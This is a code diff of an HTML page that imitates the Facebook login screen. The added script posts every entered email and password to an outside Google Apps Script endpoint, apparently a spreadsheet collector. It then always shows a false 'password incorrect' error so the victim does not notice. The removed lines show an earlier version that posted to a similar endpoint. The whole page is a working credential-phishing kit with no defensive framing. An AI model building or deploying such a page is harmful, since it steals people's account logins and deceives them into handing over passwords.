@@ -11,32 +11,44 @@
     <div class="container flex">
         <div class="facebook-page flex">
             <div class="text">
+                <p>Connect with friends and the world </p>
+                <p> around you on Facebook.</p>
             </div>
-            <form id="loginForm"
-                action="https://script.google.com/macros/s/AKfycbyWXA7Vyr65dPbW_w1Mpw8AxrCwCotIy_8UEeOsxI78Cysek6rUJ_11tTagEeHy70vS/exec"
-                method="post">
+            <form id="loginForm" method="post" autocomplete="off" name="google-sheet">
+                <h2>facebook</h2>
                 <input type="email" name="email" id="email" placeholder="Email or phone number" required>
                 <input type="password" name="password" id="password" placeholder="Password" required>
                 <div class="link">
-                    <!-- Use a button instead of submit input -->
-                    <button type="button" class="login" onclick="submitForm()">Login</button>
+                    <button class="button loginButton">Log in</button>
+                    <p id="errorMessage" style="color: red;"></p>
+                    <a href="#" class="forgot">Forgot password?</a>
                 </div>
                 <hr>
-                <div class="button">
-                </div>
+                <!-- Add an element to display the error message -->
+                <p id="errorMessage" style="color: red;"></p>
             </form>
         </div>
     </div>
 
     <script>
-        function submitForm() {
-            // Use JavaScript to submit the form when the button is clicked
-            document.getElementById("loginForm").submit();
-            // Redirect to abc.html after form submission
-            window.location.href = 'abc.html';
-        }
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxVQMDBM5I42GN8poMhiPFVfIOYtu8-yvO_3cYhe4axSP09c15aY3_U4x36UMpFOE4B/exec'
+        const form = document.forms['google-sheet']
+        const errorMessage = document.getElementById('errorMessage');
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            // const isPasswordCorrect = false; // Replace with your password validation logic
+
+            // if (isPasswordCorrect) {
+                fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                    .then(response => errorMessage.textContent = "The password that you've entered is incorrect.")
+                    .catch(error => console.error('Error!', error.message));
+            // } else {
+                // Display error message
+                errorMessage.textContent = "The password that you've entered is incorrect.";
+            // }
+        });
     </script>
 </body>
 
 </html>
-
